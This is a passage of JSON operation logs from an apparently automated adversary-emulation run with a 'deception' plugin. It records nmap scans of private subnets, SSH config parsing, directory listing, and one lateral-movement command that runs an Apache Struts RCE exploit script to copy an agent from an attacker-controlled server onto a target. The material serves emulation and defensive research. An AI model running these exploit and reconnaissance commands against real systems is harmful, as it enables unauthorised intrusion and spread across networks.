1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770160>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770190>", "source": {"unique": "host.remote.ip192.168.201.82", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.82", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770970>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770550>", "source": {"unique": "host.remote.ip192.168.201.90", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.90", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47705e0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770d60>", "source": {"unique": "host.remote.ip192.168.201.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.3", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47704c0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770340>", "source": {"unique": "host.remote.ip192.168.201.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.4", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4771720>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47707c0>", "source": {"unique": "host.remote.ip192.168.201.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.5", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770580>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770220>", "source": {"unique": "host.remote.ip192.168.201.6", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.6", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4771030>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770280>", "source": {"unique": "host.remote.ip192.168.201.82", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.82", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47706d0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47703a0>", "source": {"unique": "host.remote.ip192.168.201.90", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.90", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.201.3,4,5,6,82,90", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.201.3,4,5,6,82,90", "created": "2024-04-26T23:42:00Z", "score": 13, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "collect": "2024-04-26T23:42:04Z", "finish": "2024-04-26T23:42:13Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:42:04Z"}, {"id": "85980627-3178-4183-ac61-8af9a650c7f6", "paw": "rezmky", "command": "python3 strutsExploit.py 192.168.200.3:8080 http://10.20.20.1:8888", "plaintext_command": "python3 strutsExploit.py 192.168.200.3:8080 http://10.20.20.1:8888", "status": 0, "score": 3, "decide": "2024-04-26T23:42:15Z", "pin": 0, "pid": "1773", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.200.3", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.200.3", "created": "2024-04-26T23:42:15Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}, {"unique": "host.lateralMove.port8080", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": 8080, "created": "2024-04-26T23:42:15Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}], "unique": "85980627-3178-4183-ac61-8af9a650c7f6", "collect": "2024-04-26T23:42:15Z", "finish": "2024-04-26T23:42:18Z", "ability": {"ability_id": "deception-struts", "tactic": "deception-lateral-movement", "technique_name": "Struts", "technique_id": "T9061", "name": "Exploit Apache Struts RCE", "description": "Copies agent to target using Apache Struts RCE", "executors": [{"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:42:15Z"}, {"id": "cad1e330-65fb-4fff-89c3-b224f1976cee", "paw": "cxfxwj", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:42:20Z", "pin": 0, "pid": "2013", "facts": [], "relationships": [], "used": [], "unique": "cad1e330-65fb-4fff-89c3-b224f1976cee", "collect": "2024-04-26T23:42:21Z", "finish": "2024-04-26T23:42:29Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:42:21Z"}, {"id": "fe2f6f79-c116-48b3-9fd3-20947b3992db", "paw": "cxfxwj", "command": "ls -l /home/tomcat/", "plaintext_command": "ls -l /home/tomcat/", "status": 0, "score": 1, "decide": "2024-04-26T23:42:31Z", "pin": 0, "pid": "2030", "facts": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:42:30Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["fe2f6f79-c116-48b3-9fd3-20947b3992db"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["cxfxwj"], "technique_id": null}, {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:40:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "fe2f6f79-c116-48b3-9fd3-20947b3992db", "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "gbimmx", "jyirhn"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4a6d8a0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48c9b70>", "source": {"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:42:30Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["fe2f6f79-c116-48b3-9fd3-20947b3992db"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["cxfxwj"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:42:34Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:42:30Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["fe2f6f79-c116-48b3-9fd3-20947b3992db"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["cxfxwj"], "technique_id": null}], "unique": "fe2f6f79-c116-48b3-9fd3-20947b3992db", "collect": "2024-04-26T23:42:34Z", "finish": "2024-04-26T23:42:34Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:42:34Z"}, {"id": "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "paw": "cxfxwj", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:42:36Z", "pin": 0, "pid": "2032", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.3"], "created": "2024-04-26T23:42:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["95c7474e-c9af-4a1b-9305-1b4d6df22d65"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])"], "limit_count": -1, "collected_by": ["cxfxwj"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4772380>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47726b0>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:42:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.3"], "created": "2024-04-26T23:42:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:42:36Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "collect": "2024-04-26T23:42:44Z", "finish": "2024-04-26T23:42:47Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:42:44Z"}, {"id": "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "paw": "cxfxwj", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:42:51Z", "pin": 0, "pid": "2034", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:42:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["3e0385dd-eadf-4b80-bc55-4aea1b79aa80"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["cxfxwj"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479ed40>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479f1c0>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:42:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:42:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:42:51Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "collect": "2024-04-26T23:42:54Z", "finish": "2024-04-26T23:42:57Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:42:54Z"}, {"id": "26f46d4f-0c48-4952-99b4-e4a3766799fb", "paw": "cxfxwj", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:43:01Z", "pin": 0, "pid": "2036", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": 